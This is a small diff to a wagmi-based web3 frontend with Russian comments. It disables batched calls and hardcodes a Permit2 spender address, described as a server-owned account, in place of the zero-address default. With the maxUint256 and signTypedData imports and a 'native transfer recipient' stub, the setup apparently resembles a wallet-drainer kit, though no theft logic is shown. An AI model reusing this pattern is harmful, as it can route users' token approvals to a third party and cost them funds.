@@ -5,11 +5,11 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
-const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x0000000000000000000000000000000000000000'
+const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
